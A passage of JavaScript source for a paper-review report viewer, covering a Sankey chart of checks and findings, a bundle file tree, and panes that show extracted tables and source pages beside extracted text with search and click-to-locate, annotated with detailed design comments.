  const last=cols[cols.length-1];
  const col=c=>nodes.filter(n=>n.column===c);
  /* A node's height is its LARGER side. Summing both directions double-counts
     every middle node -- a severity in a three-stage flow receives its findings
     and passes them on, so source+target is twice its real size. */
  const inTot=id=>links.filter(l=>l.target===id).reduce((s,l)=>s+l.value,0);
  const outTot=id=>links.filter(l=>l.source===id).reduce((s,l)=>s+l.value,0);
  const tot=id=>Math.max(inTot(id),outTot(id));
  const colSum=c=>col(c).reduce((s,n)=>s+tot(n.id),0);
  const widest=Math.max(...cols.map(colSum),1);
  const mostNodes=Math.max(...cols.map(c=>col(c).length),1);
  const H=Math.max(160, widest*17 + mostNodes*GAP);
  const scale=v=>v*((H-mostNodes*GAP)/widest);
  /* Two cursors per node: ribbons arriving stack on its left face, ribbons
     leaving stack on its right. One shared cursor works only when every node
     is an endpoint. */
  const place={}; cols.forEach(c=>{let y=PAD; col(c).forEach(n=>{
    const h=Math.max(2,scale(tot(n.id)));
    place[n.id]={y,h,c,cin:y,cout:y}; y+=h+GAP;});});
  const span=cols.length>1?(W-LBL*2-NW)/(cols.length-1):0;
  const x=c=>LBL+cols.indexOf(c)*span;
  const cls=s=>'sev '+String(s).replace(/[^a-z_]/g,'');
  const ribbons=links.map(l=>{
    const a=place[l.source], b=place[l.target]; if(!a||!b) return '';
    const h=Math.max(1,scale(l.value));
    const y0=a.cout, y1=b.cin; a.cout+=h; b.cin+=h;
    const x0=x(a.c)+NW, x1=x(b.c), mx=(x0+x1)/2;
    /* Colour by whichever end carries a severity, so a ribbon keeps its colour
       through the middle column instead of turning grey on the last hop. */
    const tint=SEVERITY_ORDER.indexOf(l.target)>=0?l.target:l.source;
    return `<path class="ribbon ${cls(tint)}" d="M${x0},${y0} C${mx},${y0} ${mx},${y1} ${x1},${y1
      } L${x1},${y1+h} C${mx},${y1+h} ${mx},${y0+h} ${x0},${y0+h} Z"><title>${
      esc(l.source)} to ${esc(l.target)}: ${l.value}</title></path>`;
  }).join('');
  const bars=nodes.map(n=>{const p=place[n.id]; if(!p) return '';
    const first=p.c===cols[0];
    const anchor=first?'end':(p.c===last?'start':'middle');
    const tx=first?x(p.c)-7:(p.c===last?x(p.c)+NW+7:x(p.c)+NW/2);
    const ty=p.c===last||first?p.y+p.h/2:p.y-4;
    return `<rect x="${x(p.c)}" y="${p.y}" width="${NW}" height="${p.h}" class="${
      SEVERITY_ORDER.indexOf(n.id)>=0?cls(n.id)+' node':'node'}"></rect>`+
      `<text x="${tx}" y="${ty}" text-anchor="${anchor}" dy="${
        p.c===last||first?'.33em':'0'}">${esc(n.label)} ${
        first && n.calls!==undefined
          ? '('+n.calls+' call'+(n.calls===1?'':'s')+', '+n.findings+' finding'
            +(n.findings===1?'':'s')+')'
          : '('+tot(n.id)+')'}</text>`;
  }).join('');
  return `<div class="scroll"><svg class="sankey" viewBox="0 ${-HEAD} ${W} ${H+PAD*2+HEAD}"
    width="100%" role="img" aria-label="Checks run, the verdict each returned, and what reached the report"
    >${ribbons}${bars}</svg></div>`;
}

/* The bundle's own directory, as a directory. A flat table repeated the folder
   name on every row and made the two-directory structure -- the paper, and the
   analysis of it -- something the reader had to infer from a path prefix. */
function fileTree(files){
  if(!files.length) return '<p class="muted">Nothing recorded.</p>';
  const dirs={};
  files.forEach(f=>{
    const i=f.path.indexOf('/');
    const dir=i<0?'':f.path.slice(0,i), name=i<0?f.path:f.path.slice(i+1);
    (dirs[dir]=dirs[dir]||[]).push({...f,name});
  });
  return `<ul class="tree">`+Object.keys(dirs).sort().map(dir=>
    `<li><span class="dir">${esc(dir||'.')}/</span><ul>`+
    dirs[dir].map(f=>`<li><a href="${
      f.path.split('/').map(encodeURIComponent).join('/')}">${esc(f.name)}</a>`+
      `<span class="what">${esc(f.what)}</span></li>`).join('')+
    `</ul></li>`).join('')+`</ul>`;
}

S.push({id:'tables', label:'Tables as read', count(){
  const T = D.tables_package || {}; return (T.printed||[]).length;
}, build(){
  /* WHY THIS PANE EXISTS. Greg, 2026-08-29: a composite table read as one flat
     grid LOOKS like broken extraction, and without seeing the sections a reader
     cannot tell a correct reading from a lossy one. This shows the table
     exactly as the walker read it, and beside it the sections derived from it.

     THE BLOCKS ARE NOT EVIDENCE and the pane says so. `table_package` stamps
     every one `is_evidence: false` with provenance back to the printed table,
     and a test asserts no block id ever appears in a value anchor. A finding
     can only ever cite the printed table. */
  const T = D.tables_package || {};
  const printed = T.printed || [], blocks = T.blocks || [];
  const el = document.createElement('div');
  if (T.error) {
    el.innerHTML = '<p class="warn">The table package could not be built: '
      + esc(T.error) + '. The tables below are unavailable, which is not the '
      + 'same as the paper having none.</p>';
    return el;
  }
  if (!printed.length) {
    el.innerHTML = '<p class="muted">No tables were walked for this paper. '
      + 'That can mean the article prints none OR that the extractor could not '
      + 'see them, and this pane cannot tell you which.</p>';
    return el;
  }
  const byTable = {};
  blocks.forEach(b => { (byTable[b.printed_table_label] ||= []).push(b); });

  const n_split = Object.keys(byTable).length;
  const head = document.createElement('p');
  head.className = 'muted';
  head.innerHTML = printed.length + ' table(s) as the reader walked them. '
    + (n_split
       ? n_split + ' of them are COMPOSITE -- several logical tables printed in '
         + 'one frame -- and are shown split below. Every cell of a parent '
         + 'appears in exactly one section; the split is a reading aid, and a '
         + 'finding always cites the printed table.'
       : 'None of them carries section bands, so there is nothing to split.');
  el.appendChild(head);

  printed.forEach(t => {
    const d = document.createElement('details');
    d.className = 'tblpkg';
    const kids = byTable[t.label] || [];
    d.innerHTML = '<summary><b>' + esc(t.label) + '</b> '
      + '<span class="muted">' + (t.n_cells||0) + ' cells'
      + (t.extractor ? ' · ' + esc(String(t.extractor)) : '')
      + (kids.length ? ' · ' + kids.length + ' sections' : '')
      + '</span></summary>';
    const body = document.createElement('div');
    body.innerHTML = '<p class="muted">Printed table, canonical. Cite this.</p>'
      + '<pre class="tblmd">' + esc(t._md || '(open ' + esc(t.file) + ' in the bundle)') + '</pre>';
    kids.forEach(b => {
      body.innerHTML += '<p class="muted">Derived section <b>'
        + esc(String(b.section_label || b.block_id)) + '</b> — rows '
        + esc(String((b.printed_row_indices||[]).join(', ')))
        + ' of ' + esc(t.label) + '. Not evidence.</p>'
        + '<pre class="tblmd">' + esc(b._md || '(open ' + esc(b.file) + ')') + '</pre>';
    });
    d.appendChild(body);
    el.appendChild(d);
  });
  return el;
}});

S.push({id:'source', label:'Source & extraction', build(){
  /* Pages rendered at build time, with a clickable text layer over each.
     The browser's built-in viewer cannot do this: it reports no click position,
     exposes no text coordinates, and IGNORES a `#page=N` change once loaded --
     which is why fragment navigation appeared to work and then did not. */
  const P = D.pdf_pages || [];
  /* Every PDF in the package, one wrapper each, all but the first hidden.
     Only `pdfs[0]` used to render, so a supplement a finding rested on could
     not be looked at even though the bundle carried the file. Page element ids
     stay `pg{n}` for document 0 -- findings anchor to the paper, and
     `applyJump` addresses them by that id. */
  const pageHtml = pg=>`<div class="pgnum">page ${pg.page}${
      (pg.doc||0)?'':''}</div>
    <div class="pdfpage" ${(pg.doc||0)?'':`id="pg${pg.page}"`}
         data-doc="${pg.doc||0}" data-pw="${pg.pw}" data-ph="${pg.ph}">
      <img src="${esc(pg.img)}" alt="page ${pg.page}" loading="lazy"
           style="aspect-ratio:${pg.pw}/${pg.ph}">
      ${pg.lines.map((l,i)=>`<span class="ln" data-doc="${pg.doc||0}"
        data-p="${pg.page}" data-i="${i}"
        style="left:${(100*l.x/pg.pw).toFixed(3)}%;top:${(100*l.y/pg.ph).toFixed(3)}%;
               width:${(100*l.w/pg.pw).toFixed(3)}%;height:${(100*l.h/pg.ph).toFixed(3)}%"
        title="${esc(l.t.slice(0,90))}"></span>`).join('')}
    </div>`;
  /* EVERY DOCUMENT IN THE PACKAGE, whatever form it takes.
     `source_docs` is built in Python and carries a `kind` per document; the
     PDF records inside it are `pdf_docs` unchanged, so page ids and the
     `pdf_pages[].doc` join are untouched. Older bundles have no `source_docs`
     at all, so the PDF list is the fallback and the page behaves as it did. */
  const DOCS = (D.source_docs && D.source_docs.length)
    ? D.source_docs
    : (D.pdf_docs||[]).map(d=>({...d, kind:'pdf', locate:'lines',
                                role: d.id?'supplement':'paper'}));
  const noteHtml = d=>d.note
    ? `<p class="docnote">${esc(d.note)}</p>` : '';
  /* WHY A DOCUMENT CANNOT BE SHOWN, in words, every time. An empty pane reads
     as an empty document, and for a supplement that is the difference between
     "the authors published nothing here" and "our reader could not open it". */
  const failHtml = d=>{
    const bits=[];
    if(d.render_error) bits.push(esc(d.render_error));
    /* `extract_error` is suppressed when one of the specific flags below is
       set: they are the same fact in better words, and printing both made the
       missing OCR engine appear twice under two headings, which reads as two
       separate problems. */
    if(d.extract_error && !(d.ocr_unavailable||d.no_text_layer||d.ocr_low_confidence))
      bits.push('The extraction reported: '+esc(d.extract_error));
    if(d.ocr_unavailable) bits.push(
      'No OCR engine is installed on the machine that built this bundle, so the '+
      'text in this image was never read. That is a fact about that machine and '+
      'says NOTHING about what the document contains -- do not read it as "no '+
      'tables here".');
    if(d.no_text_layer) bits.push(
      'This PDF has no text layer: its pages are pictures. Nothing in it could '+
      'be read without OCR.');
    if(d.ocr_low_confidence) bits.push(
      'The transcription came back below the confidence floor and was refused '+
      'whole rather than returned. We could not read it; that is not the same '+
      'as it being empty.');
    if(d.clip_note) bits.push(esc(d.clip_note));
    return bits.length
      ? `<div class="docfail">${bits.map(b=>`<p>${b}</p>`).join('')}</div>` : '';
  };
  /* The LEFT pane, dispatched on kind. Each wrapper keeps `data-doc` so the
     selector can show exactly one, and `data-locate` so the click handlers know
     whether this document supports the sync at all. */
  const sourceBody = d=>{
    if(d.kind==='pdf'){
      return (d.truncated?`<p class="muted" style="padding:6px 10px">Showing ${d.pages} of
        ${d.total_pages} pages -- the bundle caps rendered pages. Open
        <a href="paper/${encodeURIComponent(d.name)}">${esc(d.name)}</a> for the rest.</p>`:'')
        + (P.filter(pg=>(pg.doc||0)===d.id).map(pageHtml).join('')
           || `<p class="muted" style="padding:10px">No page images were rendered for
                <a href="paper/${encodeURIComponent(d.name)}">${esc(d.name)}</a>.
                Open it directly.</p>`);
    }
    if(d.kind==='image'){
      return (d.img
        ? `<img class="docimg" src="${esc(d.img)}" alt="${esc(d.name)}" loading="lazy">`
        : '') + noteHtml(d) + failHtml(d);
    }
    /* A document with no published rendering of its own -- a spreadsheet, a
       .csv, publisher XML, plain text -- is shown as its own content, which is
       byte-for-byte what the extraction pane shows. Mounted from ONE stored
       string; see `source_is_extraction`. */
    const src = d.source_is_extraction ? (d.text_html||'') : (d.source_html||'');
    if(src){
      return `<div class="docbody rendered">${src}</div>`
             + noteHtml(d) + failHtml(d);
    }
    return `<p class="muted" style="padding:10px">${esc(d.name)}</p>`
           + noteHtml(d) + failHtml(d);
  };
  const docHtml = d=>`<div class="pdfdoc" data-doc="${d.id}"
      data-kind="${esc(d.kind||'pdf')}" data-locate="${esc(d.locate||'none')}"
      ${d.id?'hidden':''}>${sourceBody(d)}</div>`;
  const pdf = DOCS.length
    ? DOCS.map(docHtml).join('')
    : (D.pdf_name
        ? `<p class="muted" style="padding:10px">Page images were not rendered for this
             bundle. Open <a href="paper/${encodeURIComponent(D.pdf_name)}">${esc(D.pdf_name)}</a>
             directly.</p>`
        : '<p class="muted" style="padding:10px">No source document in this bundle.</p>');
  /* Both representations are mounted. The raw <pre> is what the search and the
     click-to-jump arithmetic operate on -- they index by character offset, and
     rendering markdown destroys those offsets. The rendered view exists to
     answer the question this pane is FOR: did the tables survive extraction?
     A wall of pipe characters cannot answer it. */
  /* RAW IS THE DEFAULT, and this REVERSES an earlier call of Greg's, on
     2026-08-11, for a reason that names its own expiry:

       "make the default view for the 'what the check reads' pane the raw
        text, not the rendered text. I want it this way until we fix the
        process of having clicks of the pdf and the rendered text instantly
        map to each other like the pdf and raw text do."

     The rendered view answers "did the tables survive extraction", which is
     the better question -- but only the raw <pre> carries `data-src-offset`,
     so only the raw pane click-syncs with the PDF. A reader who clicks a
     passage in the rendered view gets nothing, and a pane that silently does
     not respond is worse than a wall of pipe characters that does.

     REVERT THIS when the rendered view carries offsets too and click-to-jump
     works from it. The selector still offers `rendered` and the reader's
     choice is still remembered; only the initial state moved. */
  /* ONE EXTRACTION PANE PER DOCUMENT. The right-hand pane used to show the
     PAPER's text no matter which document the selector was on, so switching to
     a supplement put its pages beside the paper's words and invited a
     comparison between two different documents. Document 0 keeps the ids
     `bodytext` / `bodyrender`, because `applyJump`, `goSource` and the findings
     anchors all address the paper by them. */
  const extractHtml = d=>{
    const isPaper = (d.id===0);
    const text = isPaper ? (D.body_text||'') : (d.text||'');
    const rich = isPaper ? (D.body_html||'') : (d.text_html||'');
    const idPre = isPaper?'bodytext':`bodytext-${d.id}`;
    const idRich = isPaper?'bodyrender':`bodyrender-${d.id}`;
    const inner = (text||rich)
      ? `<pre id="${idPre}" class="srcraw" hidden>${esc(text)}</pre>
         <div id="${idRich}" class="rendered srcrich">${rich}</div>`
      : `<p class="muted" style="padding:10px">Nothing was extracted from
           ${esc(d.name||'this document')}.</p>` + failHtml(d);
    return `<div class="txtdoc" data-doc="${d.id}" ${d.id?'hidden':''}>${inner}</div>`;
  };
  const body = DOCS.length
    ? DOCS.map(extractHtml).join('')
    : (D.body_text
        ? `<div class="txtdoc" data-doc="0"><pre id="bodytext" class="srcraw" hidden>${
             esc(D.body_text)}</pre>
           <div id="bodyrender" class="rendered srcrich">${D.body_html||''}</div></div>`
        : '<p class="muted" style="padding:10px">No extracted text in this bundle.</p>');
  const figs=(D.figure_records||[]).length
    ? (D.figure_records||[]).map(f=>`<figure class="fstrip">
        <img src="figures/${encodeURIComponent((f.image_path||'').split('/').pop())}"
             alt="${esc(f.label||'figure')}" loading="lazy">
        <figcaption><b>${esc(f.label||'Figure')}</b>${f.page?` &middot; <a href="#"
          onclick="goSource(${+f.page},null);return false">p.${esc(f.page)}</a>`:''}
          ${cropTag(f.crop_confidence)}
          <span class="muted">${esc((f.caption||'').slice(0,180))}</span></figcaption>
      </figure>`).join('')
    : `<p class="muted" style="padding:8px 10px">No figures were extracted, so nothing
        appearing only in a plot was seen by any check on this paper. Figure extraction
        is opt-in (<code>--figures</code>).</p>`;
  /* Tables sit in the same strip as the figures: "did this survive extraction"
     is the same question for both, and a table that lost a column is the more
     consequential loss. Clicking a card jumps the rendered pane to that table. */
  const tabs=(D.table_records||[]).length
    ? (D.table_records||[]).map((t,ti)=>`<figure class="fstrip">
        ${t.image_only||!(t.rows||[]).length
          ? `<div class="tgrid empty"><b>No cells.</b> ${t.image_only
              ? 'This table is a PICTURE in the publisher XML, so it has no '
                +'machine-readable cells and no check in this review could '
                +'reach a single number in it.'
              : 'The extraction returned no cells for this table.'}${
              (t.warnings||[]).length?' '+esc(t.warnings[0]):''}</div>`
          : `<div class="tgrid"><table>${(t.rows||[]).map((r,ri)=>{
              /* BANNER ROWS ARE STRUCTURE, NOT DATA, and rendering them as
                 data is how a composite table becomes unreadable: the banner's
                 text repeats across every column, so "Comorbidities" looks
                 like a row of five identical measurements. Python decided
                 which rows these are (`_table_sections`); the indices are into
                 THIS grid, so the two cannot drift. */
              const isBanner=((t.sections||[])[0]||{}).banner_rows||[];
              if(isBanner.indexOf(ri)>=0){
                const label=String((r||[]).find(x=>String(x||'').trim())||'');
                return `<tr class="banner"><td colspan="${(r||[]).length||1}">`
                  +esc(label)+'</td></tr>';
              }
              return `<tr>${r.map((c,ci)=>{
                /* THE PROCESSED OVERLAY. Same grid, same slots; what changes is
                   whether the cell shows what the PAPER printed or what THIS
                   TOOLKIT made of it. A cell nothing could read is struck out,
                   so a systematic parse failure appears as holes in the grid
                   rather than as numbers nobody counted. Slot indices come from
                   Python (`_processed_cells`) against this same grid. */
                const p=((t.processed||{}).cells||{})[ri+','+ci];
                const raw=esc(String(c||''));
                if(!p) return `<td><span class="rawcell">${raw}</span>`
                  +'<span class="prcell muted">&mdash;</span></td>';
                const dead=p.kind==='non_numeric'||p.kind==='ambiguous';
                const nums=['value','sd','se','percent','count','low','high']
                  .filter(k=>p[k]!==undefined).map(k=>k+'='+p[k]).join(' ');
                return `<td><span class="rawcell">${raw}</span>`
                  +`<span class="prcell${dead?' dead':''}"><b>${esc(p.kind||'')}</b>`
                  +(nums?' '+esc(nums):'')+'</span></td>';
              }).join('')}</tr>`;
            }).join('')}</table></div>${sectionNote(t)}${processedNote(t)}`}
        <figcaption><b><a href="#" onclick="goTable(${esc(JSON.stringify(t.label))
            .replace(/"/g,'&quot;')});return false">${esc(t.label||'Table')}</a></b>
          <span class="muted"> &middot; ${t.n_rows}x${t.width}${
            t.n_footnotes?', '+t.n_footnotes+' footnote'+(t.n_footnotes===1?'':'s'):''}</span>
          ${t.processed?`<a href="#" class="popout" onclick="toggleProcessed(this);return false"
             title="Show what the toolkit made of each cell">parsed &#8644;</a>`:''}
          <a href="#" class="popout" onclick="openTable(${ti});return false"
             title="Open this table on its own, full size">open &#8599;</a><br>
          <span class="muted">${esc((t.caption||'').slice(0,150))}</span>
          ${fnotes(t)}</figcaption>
      </figure>`).join('')
    : `<p class="muted" style="padding:8px 10px">No tables were extracted. A table
        whose rules the PDF path cannot find is still printed in the page text, so
        this is a limit of our extraction rather than evidence the paper has none.</p>`;
  /* WHY the table list is what it is. A publisher XML that would not parse used
     to arrive here as an empty list and read exactly like a paper with no
     tables -- the extractor RETURNS its parse error rather than raising, and
     the bundle dropped it. An empty strip with a stated cause is a different
     document from an empty strip without one. */
  const tx=D.table_extraction||{};
  const tnote = tx.error
    ? `<p class="muted" style="padding:0 10px"><b>The table extraction reported an
        error:</b> <code>${esc(tx.error)}</code>. Any table in this paper was
        invisible to every check, and the strip above is empty for that reason --
        not because the paper has no tables.</p>`
    : ((tx.warnings||[]).length
      ? `<p class="muted" style="padding:0 10px"><b>The table extraction warned:</b>
          ${(tx.warnings||[]).map(w=>`<code>${esc(w)}</code>`).join(' ')}</p>`
      : '');

  return `<h2>Source &amp; extraction</h2>
    ${unreachable()}
    <p class="muted">Every check runs on the extracted text, not on the PDF.
      Comparing them is how you catch an extraction error before you believe a
      finding -- a dropped trailing zero, a minus sign lost to a hyphen, a table cell
      merged into its neighbour.</p>
    <div class="srcbar">
      <label for="srcq">Find in extracted text</label>
      <input type="search" id="srcq" size="34" placeholder="type to search...">
      <span class="muted" id="srchits"></span>
      <span class="spacer"></span>
      <label for="srcview">View</label>
      <select id="srcview"><option value="raw" selected>raw</option>
        <option value="rendered">rendered</option></select>
      <label for="srcsize">Size</label>
      <select id="srcsize">
        <option value="11">11</option><option value="12.5" selected>12.5</option>
        <option value="14">14</option><option value="16">16</option>
        <option value="19">19</option></select>
    </div>
    <div id="srcprev" class="preview" hidden></div>
    <div class="split" id="split">
      <div id="pane-pdf"><h4><span id="srcdoclabel">Source document</span>${
        DOCS.length>1?` <select id="srcdoc">${DOCS.map(d=>
          `<option value="${d.id}">${esc(d.label)}</option>`).join('')}</select>`:''
      }<span class="muted" id="srcsync"></span></h4><div class="pane">${pdf}</div></div>
      <div id="dragbar" title="drag to resize"></div>
      <div id="pane-txt"><h4>What the checks read<span class="muted"
        id="srctxtdoc"></span></h4><div class="pane">${body}</div></div>
    </div>
    <div class="figstrip"><h4>Extracted tables</h4>
      ${tnote}<div class="pane">${tabs}</div></div>
    <div class="figstrip"><h4>Extracted figures</h4>
      <div class="pane">${figs}</div></div>`;
}, after(){
  // Drag to resize. The pane captures the pointer for the whole drag; without
  // that, moving over the page images loses the events.
  const bar=document.getElementById('dragbar'), split=document.getElementById('split'),
        left=document.getElementById('pane-pdf');
  if(bar){
    bar.addEventListener('pointerdown', e=>{
      e.preventDefault(); bar.setPointerCapture(e.pointerId); bar.classList.add('on');
      const move = ev=>{
        const r=split.getBoundingClientRect();
        const pct=Math.min(85,Math.max(15,((ev.clientX-r.left)/r.width)*100));
        left.style.flexBasis=pct+'%';
      };
      const up = ()=>{ bar.classList.remove('on');
        bar.releasePointerCapture(e.pointerId);
        bar.removeEventListener('pointermove',move);
        bar.removeEventListener('pointerup',up); };
      bar.addEventListener('pointermove',move);
      bar.addEventListener('pointerup',up);
    });
  }

  const q=document.getElementById('srcq'),
        hits=document.getElementById('srchits'), pdfPane=document.getElementById('pane-pdf');
  const P=D.pdf_pages||[];
  const DOCS = (D.source_docs && D.source_docs.length)
    ? D.source_docs
    : (D.pdf_docs||[]).map(d=>({...d, kind:'pdf', locate:'lines',
                                role: d.id?'supplement':'paper'}));
  const docById = id=>DOCS.find(d=>+d.id===+id) || {kind:'pdf', locate:'lines'};

  /* THE RAW TEXT OF EVERY DOCUMENT, CAPTURED ONCE. `highlightText` rewrites the
     <pre>'s innerHTML to paint the marks, so reading `textContent` afterwards
     returns the highlighted copy and the next search would run against its own
     output. The paper's pane took a snapshot for exactly this reason; every
     document needs its own. */
  const RAW={};
  document.querySelectorAll('#pane-txt .txtdoc').forEach(t=>{
    const p=t.querySelector('pre.srcraw');
    RAW[+t.dataset.doc] = p ? p.textContent : '';
  });
  const paneFor = id=>document.querySelector(
    '#pane-txt .txtdoc[data-doc="'+id+'"]');
  const preFor = id=>{ const w=paneFor(id); return w?w.querySelector('pre.srcraw'):null; };
  const richFor = id=>{ const w=paneFor(id); return w?w.querySelector('.srcrich'):null; };

  /* Which document the reader is looking at. The click sync scores against
     THIS document only, on BOTH sides: each document's extracted text now sits
     in its own pane, so letting another document's pages or words compete would
     manufacture matches across two different documents -- which is the one
     thing a "compare the source against the extraction" pane must never do. */
  let curDoc = 0;
  let pre = preFor(0), rendered = richFor(0), rawText = RAW[0]||'';
  const docSel = document.getElementById('srcdoc');
  const syncNote = document.getElementById('srcsync');
  const docLabel = document.getElementById('srcdoclabel');
  const txtDocNote = document.getElementById('srctxtdoc');

  /* What the reader can expect of THIS document, said out loud in the header.
     The contract genuinely differs by kind and a pane that silently does
     nothing on click is indistinguishable from one that is broken. */
  const SYNC_NOTE={
    lines:' -- click a line here to find it in the extraction, or vice versa',
    dom:' -- click a paragraph here to find it in the extraction, or vice versa',
    none:' -- this document is an image: there is no text layer to click, so the '
        +'two panes cannot be synchronised. Compare them by eye.',
  };

  function selectDoc(id){
    curDoc = +id;
    document.querySelectorAll('#pane-pdf .pdfdoc').forEach(
      d=>{ d.hidden = (+d.dataset.doc !== curDoc); });
    document.querySelectorAll('#pane-txt .txtdoc').forEach(
      t=>{ t.hidden = (+t.dataset.doc !== curDoc); });
    if(docSel && +docSel.value!==curDoc) docSel.value=String(curDoc);
    pre = preFor(curDoc); rendered = richFor(curDoc); rawText = RAW[curDoc]||'';
    const d = docById(curDoc);
    if(docLabel) docLabel.textContent =
      (d.role==='supplement'?'Supplement'
       :d.role==='second_view'?'The same paper, extracted from another format'
       :'Source document')
      + (d.kind&&d.kind!=='pdf'?' ('+d.kind+')':'');
    if(syncNote) syncNote.textContent = SYNC_NOTE[d.locate||'none']||'';
    if(txtDocNote) txtDocNote.textContent = d.name?' -- '+d.name:'';
    // A query typed against the previous document means nothing here.
    if(q) q.value='';
    if(hits) hits.textContent='';
    const prev=document.getElementById('srcprev');
    if(prev){ prev.hidden=true; prev.innerHTML=''; }
    if(pre) pre.textContent = rawText;
    setView(chosenView, false);
  }
  if(docSel) docSel.onchange = ()=>selectDoc(docSel.value);
  /* Exposed so `goSource` can put the reader back on the paper before it
     scrolls to a page id. Findings anchor to document 0, and `applyJump`
     addresses `#pg{n}`, which is inside a wrapper that is `hidden` whenever the
     selector is on a supplement -- `scrollIntoView` on a hidden element does
     nothing, so every evidence link would have failed silently for a reader who
     had looked at a supplement first. */
  window.__srcSelectDoc = selectDoc;

  const docPages = ()=>P.filter(pg=>(pg.doc||0)===curDoc);

  /* Matches on the RAW text and escapes each segment as it goes.
     It used to escape the whole document FIRST and then search the escaped
     string for an escaped needle, which meant the search could match inside
     an HTML entity. Searching `39` on Romano reported 24 matches for one
     literal `39`: the other 23 were the `39` inside `&#39;`, and wrapping
     them in <mark> split the entity open, so the page rendered
     `women&#39;s emotion dysregulation` on screen. */
  function highlightText(needle, scroll){
    if(!pre) return 0;
    if(!needle){
      pre.textContent = rawText;
      if(hits) hits.textContent = '';   // a count with no query is stale
      return 0;
    }
    const safe = needle.replace(/[.*+?^${}()|[\]\\]/g,'\\$&');
    const re = new RegExp(safe,'gi');
    let out='', last=0, n=0, m;
    while((m=re.exec(rawText))!==null){
      if(m[0]===''){ re.lastIndex++; continue; }   // zero-width, never advances
      out += esc(rawText.slice(last,m.index))+'<mark class="hit">'+esc(m[0])+'</mark>';
      last = m.index+m[0].length; n++;
      if(n>=5000) break;                           // a one-letter query is not a search
    }
    out += esc(rawText.slice(last));
    pre.innerHTML = out;
    if(hits) hits.textContent = n
      ? n+' match'+(n===1?'':'es')+(n>=5000?' (stopped counting)':'')
      : 'no match in the extracted text';
    if(scroll){ const f=pre.querySelector('mark'); if(f) f.scrollIntoView({block:'center'}); }
    return n;
  }

  /* ---- view toggle, text size, and search previews ----
     `rendered` is no longer looked up here: it is one of the three handles
     (`pre`, `rendered`, `rawText`) that `selectDoc` rebinds, because each
     document now has its own extraction pane. Leaving the old
     `getElementById('bodyrender')` in place would have pinned every control to
     the PAPER's pane, so the view toggle and the search would have kept
     operating on the paper while the reader was looking at a supplement. */
  const viewSel=document.getElementById('srcview'),
        sizeSel=document.getElementById('srcsize'),
        prev=document.getElementById('srcprev');

  /* The view the READER chose, so a search -- which has to work on the raw
     text -- can hand it back when the box is cleared instead of silently
     leaving them in a pane they did not pick. */
  let chosenView = 'raw';
  function setView(mode, remember){
    if(!pre||!rendered) return;
    const raw = mode!=='rendered';
    pre.hidden=!raw; rendered.hidden=raw;
    if(viewSel) viewSel.value = raw?'raw':'rendered';
    if(remember!==false) chosenView = raw?'raw':'rendered';
  }
  if(viewSel) viewSel.onchange = ()=>setView(viewSel.value);
  if(sizeSel) sizeSel.onchange = ()=>{
    // Every pane, not just the visible one: a reader who sizes the text and
    // then switches documents should not have the size silently reset.
    const px=sizeSel.value+'px';
    document.querySelectorAll('#pane-txt pre.srcraw,#pane-txt .srcrich,'
      +'#pane-pdf .docbody').forEach(el=>{ el.style.fontSize=px; });
  };

  /* A list of previews the reader can pick from, rather than a bare count.
     Every hit is shown in the line it sits on, so a search for a number tells
     you WHICH table cell it came from before you jump to it. */
  function previews(needle){
    if(!prev) return;
    if(!needle || needle.length<2){ prev.hidden=true; prev.innerHTML=''; return; }
    const lines=rawText.split('\n'), low=needle.toLowerCase(), out=[];
    for(let i=0;i<lines.length && out.length<12;i++){
      const at=lines[i].toLowerCase().indexOf(low);
      if(at<0) continue;
      const from=Math.max(0,at-40), snippet=lines[i].slice(from,at+needle.length+60);
      out.push(`<button type="button" data-line="${i}">${
        esc(from?'...':'')}${esc(snippet)}</button>`);
    }
    prev.innerHTML = out.length
      ? out.join('')
      : '<span class="muted">no match in the extracted text</span>';
    prev.hidden=false;
    prev.querySelectorAll('button').forEach(b=>b.onclick=()=>{
      setView('raw');
      highlightText(needle, false);
      const marks=pre.querySelectorAll('mark.hit');
      // Which mark is this line? Count matches in the lines before it.
      const before=rawText.split('\n').slice(0,+b.dataset.line)
        .join('\n').toLowerCase().split(low).length-1;
      const target=marks[Math.min(before,marks.length-1)];
      if(target) target.scrollIntoView({block:'center'});
    });
  }

  if(q) q.oninput = ()=>{
    // Searching operates on the raw text: the highlighter rebuilds the <pre>
    // from a character offset, which the rendered HTML does not have. Clearing
    // the box hands the reader back the view they chose.
    setView(q.value ? 'raw' : chosenView, false);
    highlightText(q.value, true);
    previews(q.value);
  };

  /* ---- text -> SOURCE, shared by both panes and every document kind. ----
     Takes the text the reader clicked and scores every candidate span in the
     source against it. What a "span" is depends on the document: a PDF has line
     boxes with geometry, an HTML/EPUB/office/text document has DOM elements
     with text, and an image has neither.

     ONE SCORING FUNCTION for all of them, because the scoring is the part that
     was measured and is easy to get wrong. It scores the fraction of the SOURCE
     SPAN covered by the clicked text, not the reverse: a markdown paragraph is
     reflowed prose and a source line is ~10 words, so normalising by the
     paragraph buries every real match (a correct hit scored under 10% purely
     because the paragraph was long). */
  const weight=w=>w.length;
  function _bestSpan(probeText, spans){
    const probe=_norm(probeText||'');
    const words=[...new Set(probe.split(' ').filter(w=>w.length>4))];
    if(words.length<2) return {reason:'not enough text there to locate'};
    const has=new Set(words);
    let best=null, bestFrac=0, bestAbs=0;
    for(const sp of spans){
      const lw=[...new Set(_norm(sp.t).split(' ').filter(w=>w.length>4))];
      if(lw.length<2) continue;
      const denom=lw.reduce((a,w)=>a+weight(w),0);
      let s=0; for(const w of lw) if(has.has(w)) s+=weight(w);
      const frac=s/denom;
      if(frac>bestFrac || (frac===bestFrac && s>bestAbs)){
        bestFrac=frac; bestAbs=s; best=sp;
      }
    }
    // Demand real coverage, not merely the best of a bad field -- otherwise
    // every click lands somewhere and looks authoritative.
    if(!best || bestFrac<0.5 || bestAbs<12) return {reason:'no confident match'};
    return {span:best};
  }

  /* Every clickable element of a non-PDF document, as scoring candidates.
     Leaf-ish blocks only: scoring a <div> that contains the whole chapter would
     match everything and locate nothing. */
  function domSpans(){
    const wrap=document.querySelector(
      '#pane-pdf .pdfdoc[data-doc="'+curDoc+'"] .docbody');
    if(!wrap) return [];
    return [...wrap.querySelectorAll('p,li,tr,h1,h2,h3,h4,h5,h6,pre,blockquote,caption,dd,dt')]
      .map(el=>({t:el.textContent||'', el:el}))
      .filter(s=>s.t.trim().length>2);
  }

  function jumpToPdf(probeText){
    if(!pdfPane) return false;
    const doc=docById(curDoc), how=doc.locate||'lines';
    if(how==='none'){
      if(hits) hits.textContent=
        'this document is an image -- there is no text layer to jump to';
      return false;
    }
    if(how==='dom'){
      const spans=domSpans();
      if(!spans.length) return false;
      const got=_bestSpan(probeText, spans);
